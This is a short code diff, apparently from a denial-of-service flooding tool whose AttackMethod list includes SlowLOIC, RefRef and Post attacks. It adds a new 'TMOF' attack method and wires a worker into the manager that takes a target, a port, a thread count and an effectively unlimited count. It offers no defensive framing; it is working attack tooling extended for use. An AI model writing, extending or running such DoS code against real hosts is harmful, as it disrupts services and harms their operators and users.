@@ -15,7 +15,8 @@ namespace GAS.Core
         SlowLOIC,
         RefRef,
         AhrDosme,
-        Post
+        Post,
+        TMOF
     }
     public class Manager
     {
@@ -110,6 +111,9 @@ namespace GAS.Core
                     break;
                 case AttackMethod.Post:
                     Worker = new PostAttack(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
+                    break;
+                case AttackMethod.TMOF:
+                    Worker = new TMOF(Target.ToString(), Port, Threads, int.MaxValue);
                     break;
                 default :
                     throw new NotImplementedException("Code it yourself, lazy bastard");
